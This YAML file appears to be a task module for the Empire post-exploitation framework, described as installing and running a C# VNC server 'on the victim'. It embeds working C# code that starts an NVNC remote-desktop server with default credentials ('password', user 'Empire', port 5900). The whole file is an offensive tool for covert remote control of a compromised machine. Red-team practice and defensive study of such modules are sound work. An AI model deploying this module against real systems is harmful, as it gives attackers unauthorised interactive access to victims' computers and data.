- Name: VNCServer
  Aliases: []
  Description: |
    Installs and runs a C# VNC server on the victim.
  Author: 
      Name: Jake Krasnov
      Handle: _Hubbl3
      Link: https://twitter.com/_Hubbl3
  Help: 
  Language: CSharp
  CompatibleDotNetVersions:
  - Net35
  - Net40
  Code: |
    using System;
    using System.Drawing;

    using NVNC;

    public static class Task
    {
        public static void Execute(string Password, string Port, string Username)
        {
            int port = Int32.Parse(Port);
            VncServer s = new VncServer(Password, port, Username);
            try
            {
                  s.Start();
                  Console.WriteLine("VNC server terminated");
            }
            catch (ArgumentNullException ex)
            {
                  Console.WriteLine(ex.Message);
                  return;
            }
        }
    }
  TaskingType: Assembly
  UnsafeCompile: true
  TokenTask: false
  Options:
  - Name: Password
    Value: password
    DefaultValue: ''
    Description: Password for the VNC server.
    SuggestedValues: []
    Optional: false
    DisplayInCommand: true
    FileOption: false
  - Name: Port
    Value: 5900
    DefaultValue: ''
    Description: Port the VNC server will listen on.
    SuggestedValues: []
    Optional: false
    DisplayInCommand: true
    FileOption: false
  - Name: Username
    Value: Empire
    DefaultValue: ''
    Description: Username for the VNC server.
